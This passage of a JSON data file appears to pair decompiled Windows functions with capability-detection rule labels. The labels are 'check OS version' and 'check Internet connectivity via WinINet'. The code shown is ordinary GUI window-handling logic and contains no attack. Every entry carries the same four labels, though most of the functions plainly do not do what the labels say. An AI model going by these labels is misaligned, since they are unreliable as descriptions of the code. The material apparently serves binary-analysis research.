        puStack52 = 0x44182f;\n                iVar3 = fcn.004431a8();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x44183d;\n                    fcn.004431a8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x44185c;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x441871;\n                    fcn.0043f20c();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x497c14 + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x4418b3;\n                    cVar2 = fcn.004047cc();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x441903;\n                    iVar3 = fcn.0044319c();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x44191c;\n                    iVar3 = fcn.00443190();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4418c8;\n                    iVar6 = fcn.0043d3b4();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x4418e3;\n                    iVar7 = fcn.0043d3d4();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x441935;\n                iVar3 = fcn.004431b4();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x441943;\n                    fcn.004431b4();\n                }\n                puStack52 = 0x44194f;\n                iVar3 = fcn.004431a8();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x44195d;\n                    fcn.004431a8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x44197c;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x441991;\n                    fcn.0043f20c();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x4419b7;\n                    iVar3 = fcn.0044f640();\n                    iVar7 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4419d3;\n                    iVar3 = fcn.0044f684();\n                    iVar8 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4419ee;\n                    uVar4 = fcn.004431cc();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x441a01;\n                    iVar6 = fcn.004431b4();\n                    iVar7 = in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((in_EAX[0x12] & 1U) != 0);\n                    }\n                    iVar7 = (iVar3 + iVar6) - iVar7;\n                    puStack52 = 0x441a1c;\n                    uVar4 = fcn.004431c0();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x441a2f;\n                    iVar6 = fcn.004431a8();\n                    iVar8 = in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((in_EAX[0x13] & 1U) != 0);\n                    }\n                    iVar8 = (iVar3 + iVar6) - iVar8;\n                }\n                puStack52 = 0x441a4a;\n                iVar3 = fcn.004431b4();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x441a58;\n                    fcn.004431b4();\n                }\n                puStack52 = 0x441a64;\n                iVar3 = fcn.004431a8();\n                if (iVar8 < iVar3) {\n                    puStack52 = 0x441a72;\n                    fcn.004431a8();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x441a91;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x441ac1;\n                    iStack56 = fcn.00457a28();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x497c14 + 0x44) + 0x29c));\n                    uVar5 = fcn.00457a28(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x491570);\n                    iStack56 = 0x441b07;\n                    iStack56 = fcn.00457a28();\n                    uStack60 = 0x441b0d;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.00457a28(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x408034, uVar5);\n                    fcn.0044ff28();\n                }\n                iStack56 = *(*(*0x497c14 + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x491570);\n                iStack56 = 0x441b7a;\n                iStack56 = fcn.00457a28();\n                uStack60 = 0x441b80;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x441cb9;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.00457a28();\n        uStack60 = 0x441cbf;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3718
    },
    "00441d84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441d84(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x441db0;\n            fcn.00423d9c();\n            uStack20 = 0x441de2;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x441de9;\n            uStack20 = 0x441de1;\n            fcn.00404640();\n            return;\n        }\n        puStack16 = 0x441da2;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00441e1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441e1c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.0040483c();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x497c14 + 0x44)) {\n                    fcn.00445b64();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00441fbc();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0043f1cc();\n                }\n                else {\n                    fcn.00442098();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "00441fdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441fdc(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x44205b;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x00442045;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x0044200c:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.00457d34();\n            if (cVar2 != '\\0') goto code_r0x0044203e;\n        }\n        fcn.004075f4();\n        fcn.0040da70();\n        fcn.00404eb4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x0044200c;\n    }\ncode_r0x0044203e:\n    fcn.004402bc();\ncode_r0x00442045:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x442062;\n    uStack20 = 0x44205a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 392
    },
    "004420b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004420b4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x4423a6;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x4420d7;\n    fcn.0044e1f0();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x4420e8;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x00442125;\n    }\n    puStack60 = 0x442111;\n    fcn.004075f4();\n    puStack60 = 0x442120;\n    fcn.0040da70();\n    puStack60 = 0x442125;\n    fcn.00404eb4();\ncode_r0x00442125:\n    puStack60 = 0x44212a;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x442139;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x44213f;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x442144;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x44214e;\n    fcn.004447f0();\n    uStack64 = 0x442389;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x497c14 + 0xd4) != '\\0')) {\n        puStack72 = 0x442188;\n        puStack60 = &stack0xfffffffc;\n        fcn.00454420();\n        puStack72 = 0x442190;\n        fcn.00457a04();\n    }\n    puStack72 = 0x442195;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x44219d;\n    fcn.0043ab94();\n    puStack72 = 0x4421b7;\n    fcn.00419854();\n    *(*0x497c18 + 0x78) = in_EAX;\n    puStack72 = 0x4421db;\n    fcn.004436c0();\n    puStack72 = 0x4421ed;\n    fcn.0043ad38();\n    uStack76 = 0x442367;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x442206;\n    puStack72 = &stack0xfffffffc;\n    fcn.00441fc4();\n    uStack88 = 0x4422c6;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.00457a28(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.00445a68();\n        if (*(*0x497c14 + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.00441f24();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.00457a28(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.00457a28();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.00441fbc(0x4422cd);\n    return;\n}\n",
        "token_count": 1183
    },
    "004423b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004423b8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00453b18(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00453adc();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                fcn.004423b8(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00442428": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442428(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.004359b8(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.004359c8();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.004423b8(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "00442500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442500(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00453b18(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00453adc();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.004424d0(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00442500(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 235
    },
    "0044257c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044257c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.004424d0(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.004424d0(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00442500(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00442600": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442600(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00453b18(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00453adc();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.004425d0(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00442600(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 235
    },
    "0044267c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044267c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.004425d0(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.004425d0(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00442600(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "004426d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.004426d0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.0041fe78();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041fe4c();\n            cVar1 = fcn.004047cc();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.004426d0(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.004497a8();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 223
    },
    "0044274c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0044274c(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.0040483c(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.004426d0(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 193
    },
    "004427c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004427c4(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.0041ffe4(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "00442848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442848(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x4914e8 != NULL)) {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00457a28(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.00457a28(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.00457a28(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.00457a28(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.00457a28(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x49157c) | *(*(in_EAX + 0x350) * 4 + 0x491584));\n                (**0x4914e8)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 408
    },
    "0044295c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044295c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != *(in_EAX + 0x350)) {\n        *(in_EAX + 0x350) = param_2;\n        if (*(in_EAX + 0x350) != '\\0') {\n            iVar1 = fcn.0044726c();\n            if (*(iVar1 + 8) != '\\0') {\n                fcn.0044726c();\n                fcn.00447590();\n            }\n        }\n        fcn.00442848();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0044299c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044299c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x4914e8 != 0)) &&\n       ((*(in_EAX + 0x328) != '\\0' || (*(in_EAX + 0x350) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00442a44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.00442a44(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.0043c058();\n    fcn.0043e6d0();\n    fcn.00456550();\n    fcn.0043eaf0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 193
    },
    "00442f70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00442f70(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    puVar2 = *0x4926ac;\n    (*0x4926ac)[1] = in_EAX;\n    *puVar2 = 0x443314;\n    puVar2 = *0x4926b8;\n    (*0x4926b8)[1] = in_EAX;\n    *puVar2 = 0x443320;\n    fcn.0044332c();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x492864)(0, 0, fcn.0043e9dc, *(in_EAX + 0x58));\n    uVar3 = fcn.00423d9c();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.00423d9c();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.00423d9c();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.0044375c();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x44362c;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x44362c;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = 